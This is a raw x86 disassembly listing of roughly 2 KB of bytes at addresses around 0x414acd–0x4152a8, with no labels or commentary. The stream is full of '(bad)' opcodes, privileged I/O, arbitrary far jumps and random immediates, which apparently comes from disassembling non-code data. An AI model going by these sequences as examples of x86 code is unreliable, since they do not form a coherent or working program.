  414acd:	xor    BYTE PTR [edx+0x1bbd11],cl
  414ad3:	test   BYTE PTR [ecx-0x253b830c],bh
  414ad9:	ret    
  414ada:	outs   dx,DWORD PTR ds:[esi]
  414adb:	jae    0x414abd
  414add:	ret    0x2dc6
  414ae0:	cdq    
  414ae1:	add    eax,0xc376639e
  414ae6:	ret    0x790f
  414ae9:	adc    BYTE PTR [edx],ah
  414aeb:	sbb    BYTE PTR [esi-0x3e3ccea7],0x1a
  414af2:	loop   0x414aef
  414af4:	pushf  
  414af5:	pop    edx
  414af6:	inc    edi
  414af7:	xor    DWORD PTR [ebx-0x5778dd1b],0x7ce186fa
  414b01:	mov    cl,0xd8
  414b03:	cld    
  414b04:	jl     0x414af6
  414b06:	mov    ch,0x5f
  414b08:	mov    edi,ds
  414b0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414b0b:	sbb    ch,cl
  414b0d:	push   es
  414b0e:	out    dx,eax
  414b0f:	pop    ds
  414b10:	inc    edx
  414b11:	inc    ebx
  414b12:	xchg   BYTE PTR [esi],ah
  414b14:	mov    esp,0xd0a2578e
  414b19:	sub    bx,WORD PTR [edx+edi*1]
  414b1d:	pop    edx
  414b1e:	pop    esp
  414b1f:	cmp    BYTE PTR [esi+0x6a377261],dh
  414b25:	push   edx
  414b26:	and    eax,0xd7581912
  414b2b:	scas   eax,DWORD PTR es:[edi]
  414b2c:	shr    DWORD PTR [edi-0xf],1
  414b2f:	mov    ebx,0xcdf375e2
  414b34:	jmp    0x4031:0x3ced590a
  414b3b:	cmp    al,0x47
  414b3d:	ss std 
  414b3f:	sbb    al,0xd
  414b41:	add    bl,dl
  414b43:	cmp    eax,0x91d02191
  414b48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414b49:	and    eax,0x496c966d
  414b4e:	dec    edi
  414b4f:	sub    BYTE PTR [edi+ebx*2-0x25],dl
  414b53:	sbb    eax,0x55c7f9c1
  414b58:	sti    
  414b59:	add    eax,0x334e3724
  414b5e:	mov    ebx,0x49c466dc
  414b63:	mov    ebx,0x3136c168
  414b68:	and    BYTE PTR [edi-0x4c319c23],bh
  414b6e:	xchg   edi,eax
  414b6f:	push   esp
  414b70:	push   ecx
  414b71:	pop    esi
  414b72:	mov    ds:0xee86aea7,eax
  414b77:	(bad)  
  414b78:	aam    0x2e
  414b7a:	outs   dx,DWORD PTR ds:[esi]
  414b7b:	pop    esi
  414b7c:	outs   dx,DWORD PTR ds:[esi]
  414b7d:	cmc    
  414b7e:	jmp    0x2a7:0x384a9064
  414b85:	add    DWORD PTR [ebx-0x68],esp
  414b88:	dec    eax
  414b89:	xor    eax,0xb9aabcf
  414b8e:	jbe    0x414b92
  414b90:	sbb    dl,BYTE PTR [ebx]
  414b92:	xor    BYTE PTR ds:0xc297902c,0xd5
  414b99:	rcl    DWORD PTR [ebx],1
  414b9b:	or     BYTE PTR [esi],bh
  414b9d:	mov    esi,0xb648232a
  414ba2:	sub    BYTE PTR [ebx+0x75105d2d],dh
  414ba8:	push   0x798e23a4
  414bad:	cld    
  414bae:	fdiv   st(2),st
  414bb0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414bb1:	in     al,dx
  414bb2:	mov    ds:0xedab2fa7,al
  414bb7:	in     eax,0x7d
  414bb9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414bba:	sub    al,0x23
  414bbc:	outs   dx,DWORD PTR ds:[esi]
  414bbd:	pop    esi
  414bbe:	popf   
  414bbf:	out    dx,eax
  414bc0:	mov    al,0xc3
  414bc2:	xor    al,0xac
  414bc4:	add    al,0x85
  414bc6:	lock aas 
  414bc8:	subps  xmm0,XMMWORD PTR [esi-0x4f]
  414bcc:	popa   
  414bcd:	mov    eax,cs:0xd22ea3d6
  414bd3:	xchg   edx,eax
  414bd4:	out    dx,al
  414bd5:	and    al,dh
  414bd7:	inc    esp
  414bd8:	push   0xfeb7df8a
  414bdd:	inc    edi
  414bde:	out    0xfd,eax
  414be0:	cmp    ah,al
  414be2:	into   
  414be3:	or     ch,BYTE PTR [ecx+0x7a]
  414be6:	stc    
  414be7:	xchg   BYTE PTR [ebx-0x1dfbe633],ah
  414bed:	cmp    ecx,DWORD PTR [ebp+0x2d]
  414bf0:	icebp  
  414bf1:	jnp    0x414bc9
  414bf3:	xor    edx,DWORD PTR [edx-0x4acf1d6a]
  414bf9:	jle    0x414c4d
  414bfb:	shr    dh,0x8e
  414bfe:	push   edi
  414bff:	daa    
  414c00:	xchg   esi,eax
  414c01:	sbb    al,0xa5
  414c03:	dec    ebp
  414c04:	pusha  
  414c05:	in     al,0x26
  414c07:	fs in  al,0xbc
  414c0a:	into   
  414c0b:	rcr    DWORD PTR [edi],1
  414c0d:	jbe    0x414c58
  414c0f:	iret   
  414c10:	sbb    eax,0xf0107e7c
  414c15:	cmp    ebp,ebp
  414c17:	call   0x69cf6860
  414c1c:	test   eax,0x7bb8f2eb
  414c21:	cs push 0x6
  414c24:	xor    DWORD PTR [edi-0x489b032c],0xffffff9a
  414c2b:	jp     0x414c17
  414c2d:	jle    0x414c5d
  414c2f:	scas   al,BYTE PTR es:[edi]
  414c30:	sub    al,ch
  414c32:	pop    ebx
  414c33:	pop    ds
  414c34:	adc    eax,0x12f27c2e
  414c39:	mov    edi,DWORD PTR [esi+edi*4+0x1b]
  414c3d:	mov    dh,0x58
  414c3f:	bound  edi,QWORD PTR [esp+eax*8]
  414c42:	frstor [edx-0x4e934735]
  414c48:	sub    BYTE PTR [eax+0x300170c8],bh
  414c4e:	jb     0x414c16
  414c50:	sub    DWORD PTR [edi+edi*8],0xffffffed
  414c54:	xor    bl,BYTE PTR [ecx-0x7dd34b26]
  414c5a:	dec    ecx
  414c5b:	pop    ds
  414c5c:	and    DWORD PTR [ecx],ebx
  414c5e:	and    eax,0x9d5ceeb7
  414c63:	or     dh,BYTE PTR [esi]
  414c65:	fcmovne st,st(3)
  414c67:	sbb    ebp,DWORD PTR [ebx+0x2]
  414c6a:	adc    eax,0xd2aa1d1c
  414c6f:	mov    bh,0xcf
  414c71:	jg     0x414cbd
  414c73:	mov    ch,0xa7
  414c75:	adc    ah,BYTE PTR [ecx]
  414c77:	lea    esp,[esi+edx*4-0x2f]
  414c7b:	push   esi
  414c7c:	arpl   sp,ax
  414c7e:	or     BYTE PTR [eax],bl
  414c80:	mov    esp,DWORD PTR [esi]
  414c82:	jb     0x414cb5
  414c84:	jg     0x414c53
  414c86:	xor    bh,dh
  414c88:	sbb    bl,BYTE PTR [edi+0x5fac6327]
  414c8e:	xchg   ecx,eax
  414c8f:	mov    ch,0x87
  414c91:	pushf  
  414c92:	pusha  
  414c93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414c94:	or     ebp,ebp
  414c96:	jb     0x414c80
  414c98:	jno    0x414d01
  414c9a:	and    eax,0xe843b8a9
  414c9f:	dec    ebx
  414ca0:	idiv   DWORD PTR [ebx+ebx*8+0x11]
  414ca4:	mov    ds,WORD PTR [edx-0x20524781]
  414caa:	daa    
  414cab:	push   esp
  414cac:	jae    0x414cd7
  414cae:	je     0x414c69
  414cb0:	sub    al,0xec
  414cb2:	and    al,0x66
  414cb4:	loope  0x414c95
  414cb6:	outs   dx,BYTE PTR ds:[esi]
  414cb7:	(bad)  
  414cb8:	sti    
  414cb9:	push   eax
  414cba:	rol    BYTE PTR [edi-0x3f],cl
  414cbd:	xchg   ebp,eax
  414cbe:	xor    dh,BYTE PTR [eax-0x74]
  414cc1:	xchg   ebx,eax
  414cc2:	in     eax,dx
  414cc3:	ret    0x7add
  414cc6:	push   0x9bdd14c
  414ccb:	popf   
  414ccc:	sub    DWORD PTR [esi-0x6a],esp
  414ccf:	cmp    dl,BYTE PTR [eax]
  414cd1:	sbb    BYTE PTR ds:0x4dc127ee,0x60
  414cd8:	pop    edx
  414cd9:	sar    DWORD PTR [edx],cl
  414cdb:	adc    ebp,DWORD PTR ds:0xa51000e3
  414ce1:	or     BYTE PTR [esi-0x2a87c7d3],ch
  414ce7:	cmp    DWORD PTR [eax],ebp
  414ce9:	cmp    DWORD PTR ds:0x120bf52d,0x16
  414cf0:	mov    ebx,0x9a6a893e
  414cf5:	jmp    0x2042:0x5a7b110d
  414cfc:	lods   eax,DWORD PTR ds:[esi]
  414cfd:	cmp    DWORD PTR [edx],0x6a
  414d00:	inc    BYTE PTR [eax+0x2710e772]
  414d06:	sbb    DWORD PTR [ecx],edx
  414d08:	add    eax,0x76bc6137
  414d0d:	pop    esi
  414d0e:	inc    ecx
  414d0f:	xor    DWORD PTR [edx-0x32f005f1],eax
  414d15:	cld    
  414d16:	ficomp WORD PTR [ebx+0x6b]
  414d19:	pop    edi
  414d1a:	cmp    al,0xa
  414d1c:	retf   0xd6de
  414d1f:	fs lock jo 0x414d19
  414d23:	xor    eax,0x9fdf79f3
  414d28:	mov    dl,BYTE PTR [ecx-0x271471cb]
  414d2e:	or     bh,bh
  414d30:	divps  xmm7,XMMWORD PTR [esi+0xd]
  414d34:	in     al,dx
  414d35:	and    eax,esp
  414d37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414d38:	push   es
  414d39:	jg     0x414d97
  414d3b:	xor    bh,0xac
  414d3e:	dec    ecx
  414d3f:	das    
  414d40:	pop    es
  414d41:	and    BYTE PTR [ecx],dl
  414d43:	lods   eax,DWORD PTR ds:[esi]
  414d44:	push   edx
  414d45:	out    0x28,eax
  414d47:	jecxz  0x414d5b
  414d49:	pop    esp
  414d4a:	xor    al,0x81
  414d4c:	aad    0xd3
  414d4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d4f:	ins    DWORD PTR es:[edi],dx
  414d50:	sti    
  414d51:	gs jae 0x414d18
  414d54:	sub    al,0xbd
  414d56:	les    ebx,FWORD PTR [ebx-0x4]
  414d59:	imul   eax,DWORD PTR [ebx],0x4f2eb18b
  414d5f:	psrld  mm6,mm2
  414d62:	mov    edx,0xac610c84
  414d67:	xchg   esi,eax
  414d68:	ror    BYTE PTR [ebp+0x78de1f3a],cl
  414d6e:	je     0x414d6b
  414d70:	hlt    
  414d71:	daa    
  414d72:	mov    al,ds:0x3b5932d1
  414d77:	mov    eax,eax
  414d79:	jp     0x414d5f
  414d7b:	xor    al,0xaf
  414d7d:	dec    eax
  414d7e:	test   DWORD PTR ds:0x2f42ba21,edi
  414d84:	and    BYTE PTR [ebx+0x4cbfe030],0x68
  414d8b:	pop    ss
  414d8c:	sbb    eax,0xde9dcc07
  414d91:	xchg   esp,eax
  414d92:	xchg   ecx,eax
  414d93:	or     ah,BYTE PTR [esi+0x393c694a]
  414d99:	inc    ecx
  414d9a:	in     al,dx
  414d9b:	ins    BYTE PTR es:[edi],dx
  414d9c:	ins    BYTE PTR es:[edi],dx
  414d9d:	popfw  
  414d9f:	mov    esi,0x9d3a058f
  414da4:	sbb    bh,ch
  414da6:	dec    esp
  414da7:	mov    ebp,0xca63cc86
  414dac:	arpl   WORD PTR [ecx],ax
  414dae:	sahf   
  414daf:	pop    edi
  414db0:	shl    BYTE PTR [ebp+0x615cc6a9],cl
  414db6:	sbb    DWORD PTR [ecx-0x6d],edi
  414db9:	jl     0x414dd7
  414dbb:	mov    al,0xbb
  414dbd:	daa    
  414dbe:	push   es
  414dbf:	adc    esi,DWORD PTR [ebx+0x41]
  414dc2:	mov    ss,edx
  414dc4:	repnz pop esp
  414dc6:	xchg   ecx,ebx
  414dc8:	aad    0x62
  414dca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414dcb:	clc    
  414dcc:	and    bh,cl
  414dce:	and    eax,0x49aae66c
  414dd3:	or     eax,DWORD PTR [edi+0x6e4e3d88]
  414dd9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414dda:	jo     0x414d60
  414ddc:	daa    
  414ddd:	dec    edi
  414dde:	shr    dh,cl
  414de0:	and    ebp,ebp
  414de2:	sbb    eax,0xfd4e255b
  414de7:	jb     0x414e14
  414de9:	inc    edx
  414dea:	jge    0x414ddf
  414dec:	cdq    
  414ded:	pop    esi
  414dee:	mov    dl,0x82
  414df0:	dec    ecx
  414df1:	jmp    0x414e1c
  414df3:	sahf   
  414df4:	in     eax,dx
  414df5:	mov    eax,0x7a819279
  414dfa:	jnp    0x414dd0
  414dfc:	dec    ecx
  414dfd:	ins    BYTE PTR es:[edi],dx
  414dfe:	int3   
  414dff:	jae    0x414e34
  414e01:	push   ebx
  414e02:	mov    edx,0xe2480c36
  414e07:	inc    ebp
  414e08:	mov    BYTE PTR [esi],bh
  414e0a:	mov    ds:0xdae7311b,eax
  414e0f:	out    0xec,al
  414e11:	adc    bh,0xa5
  414e14:	add    esp,eax
  414e16:	cld    
  414e17:	jbe    0x414e07
  414e19:	inc    esi
  414e1a:	dec    esp
  414e1b:	out    0x99,al
  414e1d:	sub    cl,BYTE PTR [esi+0x63]
  414e20:	fnsave [ebp-0x79465b3a]
  414e26:	sbb    eax,0xbb0b2ebd
  414e2b:	(bad)  
  414e2c:	mul    BYTE PTR [edi+0x59e32a8a]
  414e32:	stos   BYTE PTR es:[edi],al
  414e33:	add    DWORD PTR [edi],0x79
  414e36:	rcr    BYTE PTR [esi+0x2e],0x21
  414e3a:	pop    es
  414e3b:	inc    ebp
  414e3c:	retf   
  414e3d:	sbb    eax,0x575c9c94
  414e42:	out    0x1a,al
  414e44:	cwde   
  414e45:	push   0x9b5cd590
  414e4a:	retf   
  414e4b:	dec    ebx
  414e4c:	inc    esp
  414e4d:	out    dx,eax
  414e4e:	cdq    
  414e4f:	sar    eax,1
  414e51:	push   es
  414e52:	lock adc edx,esi
  414e55:	hlt    
  414e56:	daa    
  414e57:	cmp    edx,ebp
  414e59:	iret   
  414e5a:	leave  
  414e5b:	pop    esi
  414e5c:	arpl   WORD PTR [esi-0x6d8ac0ee],dx
  414e62:	ja     0x414e7b
  414e64:	sbb    ch,cl
  414e66:	pavgb  mm2,QWORD PTR ds:0x30fec7be
  414e6d:	mov    edi,DWORD PTR [edx-0x56449058]
  414e73:	inc    edx
  414e74:	push   ebp
  414e75:	jmp    0x9e4f9b3a
  414e7a:	int3   
  414e7b:	std    
  414e7c:	pop    es
  414e7d:	(bad)  
  414e7e:	cs (bad) 
  414e80:	push   eax
  414e81:	repnz (bad) 
  414e83:	cs xchg ebp,eax
  414e85:	addr16 cmp al,0x2a
  414e88:	aas    
  414e89:	int    0xf0
  414e8b:	or     al,0xcc
  414e8d:	or     ecx,eax
  414e8f:	imul   BYTE PTR [eax]
  414e91:	mov    esp,0x191c4a34
  414e96:	mov    ah,0xc8
  414e98:	clc    
  414e99:	(bad)  
  414e9b:	enter  0x53e3,0xe9
  414e9f:	popf   
  414ea0:	jecxz  0x414ed3
  414ea2:	clc    
  414ea3:	inc    esi
  414ea4:	mov    edx,DWORD PTR [esi-0x78]
  414ea7:	inc    edi
  414ea8:	or     ebx,DWORD PTR [ebp-0x64]
  414eab:	xchg   ebx,eax
  414eac:	mov    ds:0xa8db17eb,eax
  414eb1:	cli    
  414eb2:	jns    0x414ed2
  414eb4:	mov    bl,0xff
  414eb6:	or     BYTE PTR [edi-0x45e60121],bh
  414ebc:	xchg   DWORD PTR [ebp-0x30],eax
  414ebf:	mov    al,ds:0xa422df64
  414ec4:	push   0xfffffff5
  414ec6:	cmp    BYTE PTR [ecx],dl
  414ec8:	add    BYTE PTR [esi],bh
  414eca:	out    dx,al
  414ecb:	xchg   ebx,eax
  414ecc:	push   ds
  414ecd:	scas   eax,DWORD PTR es:[edi]
  414ece:	loop   0x414e61
  414ed0:	mov    esp,0x7e09f23a
  414ed5:	shl    DWORD PTR [eax+0x71],0x63
  414ed9:	ret    
  414eda:	pop    esp
  414edb:	sbb    DWORD PTR [edi-0x36418e3f],0xffffffbb
  414ee2:	cmp    DWORD PTR [esi],edi
  414ee4:	(bad)  
  414ee5:	rol    BYTE PTR [ebx-0x20],cl
  414ee8:	lahf   
  414ee9:	in     al,dx
  414eea:	ss mov ah,0xe3
  414eed:	ss and esi,ebp
  414ef0:	mov    ds:0xe34dee42,al
  414ef5:	aad    0x3b
  414ef7:	sub    edi,DWORD PTR [esi+0x60]
  414efa:	and    edx,DWORD PTR [esi]
  414efc:	dec    esp
  414efd:	xor    DWORD PTR [ebx],0x1afb0b8a
  414f03:	nop
  414f04:	jae    0x414f7d
  414f06:	in     al,dx
  414f07:	nop
  414f08:	imul   sp,WORD PTR ds:0x33efb828,0x78
  414f10:	xchg   ebx,eax
  414f11:	sub    BYTE PTR [ebp+0x7a],bl
  414f14:	pop    eax
  414f15:	adc    esp,DWORD PTR [esp+eiz*8-0x2b7e2298]
  414f1c:	or     eax,0x2955c9de
  414f21:	jmp    0xd25b3814
  414f26:	jecxz  0x414f32
  414f28:	sub    DWORD PTR [edi-0xc],0xffffffbb
  414f2c:	adc    ecx,DWORD PTR [ebx+edx*4+0x424af291]
  414f33:	clc    
  414f34:	add    BYTE PTR [ebp-0x7f358725],0xe
  414f3b:	mov    cl,0xa
  414f3d:	pop    eax
  414f3e:	test   eax,0xc983be7b
  414f43:	ret    
  414f44:	iret   
  414f45:	int    0x20
  414f47:	xchg   ebx,eax
  414f48:	sbb    eax,0x93cde619
  414f4d:	jns    0x414fb7
  414f4f:	movups xmm4,xmm4
  414f52:	jne    0x414f96
  414f54:	add    eax,0x9cda38c2
  414f59:	inc    BYTE PTR [si]
  414f5c:	nop
  414f5d:	loope  0x414f44
  414f5f:	stos   DWORD PTR es:[edi],eax
  414f60:	push   edi
  414f61:	sbb    esp,DWORD PTR [edi+edx*4]
  414f64:	scas   al,BYTE PTR es:[edi]
  414f65:	pop    edx
  414f66:	xchg   BYTE PTR [ebx],bl
  414f68:	mov    ebp,0xd97af4aa
  414f6d:	sbb    esi,DWORD PTR [ecx+ebp*1-0x70ef0704]
  414f74:	push   0xeba2d065
  414f79:	dec    edi
  414f7a:	call   0xc207:0x53ad5c31
  414f81:	pop    ds
  414f82:	call   0x7393:0xc38112f9
  414f89:	imul   esp,edx,0xbe403f79
  414f8f:	cmp    al,0x50
  414f91:	mov    bl,0x42
  414f93:	aam    0xc5
  414f95:	jns    0x414f94
  414f97:	sbb    al,0x48
  414f9a:	push   ds
  414f9b:	dec    ebp
  414f9c:	lods   eax,DWORD PTR ds:[esi]
  414f9d:	cld    
  414f9e:	cmp    al,0x93
  414fa0:	cmp    bl,BYTE PTR ds:0xfb769201
  414fa6:	outs   dx,BYTE PTR ds:[esi]
  414fa7:	or     al,bl
  414fa9:	call   0x44dc:0xb2e652a0
  414fb0:	adc    ebp,DWORD PTR [ebx+0x2e]
  414fb3:	clc    
  414fb4:	jns    0x414fe0
  414fb6:	jae    0x414f47
  414fb8:	mov    ah,0x92
  414fba:	dec    ecx
  414fbb:	mov    dh,0x1e
  414fbd:	mov    edx,tr5
  414fc0:	fbld   TBYTE PTR [eax]
  414fc2:	jnp    0x415003
  414fc4:	xchg   ebp,eax
  414fc5:	(bad)  
  414fc6:	mul    BYTE PTR gs:[edi-0x3475e3ed]
  414fcd:	mov    dh,0xbf
  414fcf:	lock xchg edi,eax
  414fd1:	mov    ecx,0x9cb0708a
  414fd6:	sbb    BYTE PTR [ecx],dh
  414fd8:	mov    bl,0x7d
  414fda:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414fdb:	js     0x415002
  414fdd:	jp     0x415009
  414fdf:	push   edi
  414fe0:	in     al,dx
  414fe1:	sti    
  414fe2:	mov    al,0x20
  414fe4:	ins    DWORD PTR es:[edi],dx
  414fe5:	(bad)  [esi-0x6a]
  414fe8:	pushf  
  414fe9:	add    eax,0x2ca3ef77
  414fee:	in     al,0x81
  414ff0:	and    dh,BYTE PTR [esi]
  414ff2:	fstp   TBYTE PTR [ecx]
  414ff4:	gs inc ebx
  414ff6:	sbb    DWORD PTR [ecx-0x79],ebx
  414ff9:	push   ds
  414ffa:	out    dx,al
  414ffb:	or     al,0x5b
  414ffd:	cmp    DWORD PTR [eax-0x381a58ca],edi
  415003:	lea    eax,[esi]
  415005:	les    ebp,FWORD PTR [eax]
  415007:	sbb    eax,0x72fae471
  41500c:	in     al,0x9b
  41500e:	mov    edx,0x5037d051
  415013:	or     eax,0xeed2c36a
  415018:	xchg   esp,eax
  415019:	lock jno 0x414fda
  41501c:	pop    ss
  41501d:	pop    ecx
  41501e:	sahf   
  41501f:	and    DWORD PTR [ecx],esi
  415021:	mov    ds:0xf7b84992,eax
  415026:	push   edi
  415027:	push   0x8c0692db
  41502c:	fnsave ds:0x79fa056c
  415032:	mov    bh,BYTE PTR es:[esi+0x2d863d31]
  415039:	or     DWORD PTR [edi-0x72],edi
  41503c:	shr    esp,cl
  41503e:	dec    ebx
  41503f:	inc    esp
  415040:	xor    BYTE PTR [eax+eiz*1],0xb0
  415044:	pop    eax
  415045:	push   0x7df8eb96
  41504a:	(bad)  
  41504c:	into   
  41504d:	and    BYTE PTR [edi+0x5b7b8b0e],al
  415053:	mov    ebp,0xb20f276a
  415058:	cmp    DWORD PTR [ebx-0x1d4d6cf3],esi
  41505e:	call   edi
  415060:	mov    edx,0x6c1e7366
  415065:	js     0x4150e1
  415067:	repnz out 0x2c,eax
  41506a:	stc    
  41506b:	sbb    ah,bh
  41506d:	sbb    BYTE PTR [ebx],al
  41506f:	das    
  415070:	mov    edi,0x138cb3fc
  415075:	and    bh,bh
  415077:	iret   
  415078:	enter  0xd05a,0xa9
  41507c:	add    cl,dh
  41507e:	add    DWORD PTR [ebx-0xb],esi
  415081:	mov    ds:0x8a9eaeac,eax
  415086:	or     BYTE PTR [ecx+eax*1-0xb],bh
  41508a:	jbe    0x415067
  41508c:	pop    eax
  41508d:	sub    edx,esi
  41508f:	repnz mov ds:0xe388beef,eax
  415095:	pop    edi
  415096:	test   BYTE PTR [ecx+edi*8-0x7cad4112],bh
  41509d:	stos   DWORD PTR es:[edi],eax
  41509e:	xchg   edi,eax
  41509f:	push   edx
  4150a0:	xchg   BYTE PTR [ecx+0x1a9d596c],bh
  4150a6:	stc    
  4150a7:	mov    edi,0x5a45d321
  4150ac:	test   DWORD PTR [edi+0x40487344],ebx
  4150b2:	xor    edi,esp
  4150b4:	test   BYTE PTR [ebx+edi*2],dh
  4150b7:	int    0xf9
  4150b9:	xchg   edi,eax
  4150ba:	lods   al,BYTE PTR ds:[esi]
  4150bb:	aas    
  4150bc:	sub    eax,0x8f66362c
  4150c1:	pop    edx
  4150c2:	ins    DWORD PTR es:[edi],dx
  4150c3:	xchg   al,dh
  4150c5:	mov    al,0x82
  4150c7:	pop    edi
  4150c8:	push   esi
  4150c9:	add    BYTE PTR [eax+0x74],dh
  4150cc:	lock retf 0xccdd
  4150d0:	mov    ecx,DWORD PTR [eax-0x340c3f48]
  4150d6:	or     eax,0xec73e81d
  4150db:	pop    esi
  4150dc:	mov    edx,0x88ea86a0
  4150e1:	push   ecx
  4150e2:	dec    ebp
  4150e3:	(bad)  
  4150e4:	jge    0x415098
  4150e6:	sti    
  4150e7:	push   es
  4150e8:	lods   al,BYTE PTR ds:[esi]
  4150e9:	fimul  WORD PTR [edx-0x7a]
  4150ec:	loope  0x415126
  4150ee:	sbb    ah,BYTE PTR [ebp+0xa]
  4150f1:	popf   
  4150f2:	mov    dh,0x77
  4150f4:	lock sub cl,BYTE PTR [esi-0x1f244fa3]
  4150fb:	dec    esi
  4150fc:	cmp    DWORD PTR [esi+0x4911ae39],ebx
  415102:	pop    ss
  415103:	and    al,0x17
  415105:	dec    edx
  415106:	cmp    BYTE PTR [ebp+0x17],ch
  415109:	sbb    cl,BYTE PTR [esp+ebx*8-0x5494d49a]
  415110:	jns    0x415190
  415112:	shr    DWORD PTR [edi-0xbb415d4],0x7d
  415119:	jge    0x415122
  41511b:	in     al,dx
  41511c:	pop    ebp
  41511d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41511e:	sub    bh,BYTE PTR [esi]
  415120:	in     al,0x91
  415122:	push   ebp
  415123:	and    al,0x32
  415125:	dec    ebx
  415126:	inc    esp
  415127:	push   0xb1937a6d
  41512c:	jecxz  0x41516d
  41512e:	mov    ah,0x63
  415130:	sbb    eax,0x2afcfeb3
  415135:	cmp    BYTE PTR [ebp+ebp*2+0x1b9f9fe],ch
  41513c:	sub    DWORD PTR [ecx],0xc51ef879
  415142:	sbb    al,0x92
  415144:	retf   0xf969
  415147:	ins    BYTE PTR es:[edi],dx
  415148:	ins    BYTE PTR es:[edi],dx
  415149:	mov    esp,0xcbd66a94
  41514e:	(bad)  
  41514f:	dec    esp
  415150:	adc    BYTE PTR [eax+0x2a],dh
  415153:	and    esi,DWORD PTR [edx]
  415155:	add    al,0x55
  415157:	lds    eax,FWORD PTR [edi]
  415159:	sub    DWORD PTR [ebx],esi
  41515b:	or     DWORD PTR [ebx-0x67],edx
  41515e:	aaa    
  41515f:	sbb    esi,DWORD PTR [eax+0x15]
  415162:	jle    0x41517b
  415164:	mov    dl,0xdc
  415166:	mov    ah,0x5c
  415168:	stc    
  415169:	mov    ch,0x66
  41516b:	lea    ebx,[edi-0x8a3a75e]
  415171:	dec    eax
  415172:	mov    BYTE PTR [ebx+0x31ffd129],dh
  415178:	cwde   
  415179:	adc    eax,0xb51b18b3
  41517e:	cmp    DWORD PTR [esi],ebp
  415180:	and    DWORD PTR [ecx+edi*2-0x12],edi
  415184:	mov    dl,0x23
  415186:	xlat   BYTE PTR ds:[ebx]
  415187:	add    eax,0x54af402f
  41518c:	outs   dx,WORD PTR ds:[esi]
  41518e:	mov    dl,0x9d
  415190:	loop   0x4151ac
  415192:	fdivr  QWORD PTR [eax+0x66e3d236]
  415198:	and    BYTE PTR [ecx-0x6fa2b88],cl
  41519e:	outs   dx,BYTE PTR ds:[esi]
  41519f:	sbb    DWORD PTR [edx-0x17c9f6f6],0x5700f4ad
  4151a9:	pop    esi
  4151aa:	xor    al,0x21
  4151ac:	fsub   st(6),st
  4151ae:	push   0xd7c6c531
  4151b3:	ret    
  4151b4:	scas   al,BYTE PTR es:[edi]
  4151b5:	jb     0x415148
  4151b7:	jo     0x415210
  4151b9:	and    dh,bh
  4151bb:	popa   
  4151bc:	xchg   ebx,eax
  4151bd:	imul   ecx,DWORD PTR [ecx],0x9c9ce355
  4151c3:	icebp  
  4151c4:	aas    
  4151c5:	cmp    BYTE PTR [ecx],0x86
  4151c8:	inc    esi
  4151c9:	pop    ebx
  4151ca:	in     al,0xd
  4151cc:	add    eax,0x338e6153
  4151d1:	popf   
  4151d2:	rcl    DWORD PTR [edi],1
  4151d4:	or     BYTE PTR [ebx-0x4328bffd],0xa9
  4151db:	gs sbb al,0x41
  4151de:	mov    ds:0xd5993d55,al
  4151e3:	add    esp,DWORD PTR [edx+0x13]
  4151e6:	imul   ebp,ebp,0xffffffda
  4151e9:	push   ebx
  4151ea:	jbe    0x415199
  4151ec:	mov    cs,WORD PTR [esi+0x63]
  4151ef:	sub    DWORD PTR [ebx+0x47],eax
  4151f2:	push   ds
  4151f3:	sbb    BYTE PTR [ebp-0x7edf18a7],dl
  4151f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4151fa:	out    0xef,al
  4151fc:	stos   DWORD PTR es:[edi],eax
  4151fd:	jbe    0x4151d9
  4151ff:	dec    ebp
  415200:	xor    edx,esp
  415202:	repnz xchg esi,eax
  415204:	in     al,dx
  415205:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415206:	xor    eax,0xc4679c0d
  41520b:	xor    al,0x86
  41520d:	addr16 jge 0x415192
  415210:	mov    ebx,0x8e70050a
  415215:	add    eax,0xd474b21f
  41521a:	fucomi st,st(3)
  41521c:	mov    edi,0x54ae05e8
  415221:	mov    eax,ds:0xe393d47d
  415226:	aam    0x6a
  415228:	add    DWORD PTR [esi],0xffffffe3
  41522b:	mov    ah,dl
  41522d:	or     DWORD PTR [edi],ebx
  41522f:	mov    edx,0xd01c9ee
  415234:	add    ebp,eax
  415236:	test   al,0x79
  415238:	cmp    dh,BYTE PTR [eax]
  41523a:	setg   BYTE PTR [edx]
  41523d:	arpl   WORD PTR [edx-0x23],ax
  415240:	or     BYTE PTR [eax],ah
  415242:	fcomp  QWORD PTR [edx-0x29]
  415245:	ins    DWORD PTR es:[edi],dx
  415246:	shl    ebx,cl
  415248:	pushf  
  415249:	(bad)  
  41524a:	mov    ah,0x97
  41524c:	inc    esi
  41524d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41524e:	sbb    dh,BYTE PTR [ebx]
  415250:	push   esi
  415251:	xchg   edx,eax
  415252:	or     ah,ch
  415254:	cwde   
  415255:	loop   0x4151f6
  415257:	mov    edx,0xc8a693f2
  41525c:	pop    ebx
  41525d:	dec    edi
  41525e:	imul   edx
  415260:	xor    eax,0x293c5f00
  415265:	mov    ecx,0xa4c3db90
  41526a:	pop    eax
  41526b:	aam    0xcb
  41526d:	xor    al,0xd4
  41526f:	dec    edx
  415270:	adc    BYTE PTR [edi+0x389c18d8],ch
  415276:	pop    esp
  415277:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415278:	pop    esp
  415279:	sub    eax,0x63a8489c
  41527e:	push   es
  41527f:	jmp    0xedc98a24
  415284:	(bad)  
  415285:	mov    ecx,0x2a7a0f9e
  41528a:	ret    
  41528b:	retf   0xdf26
  41528e:	mov    ds,WORD PTR [bp-0x1924]
  415293:	gs stos DWORD PTR es:[edi],eax
  415295:	sub    esp,DWORD PTR [ecx+0x15]
  415298:	aaa    
  415299:	mov    ds:0x1cb5f7c9,al
  41529e:	shl    BYTE PTR [ebx-0x2ccd6281],0x8e
  4152a5:	cmp    dh,0xc9
  4152a8:	jae    0x415274
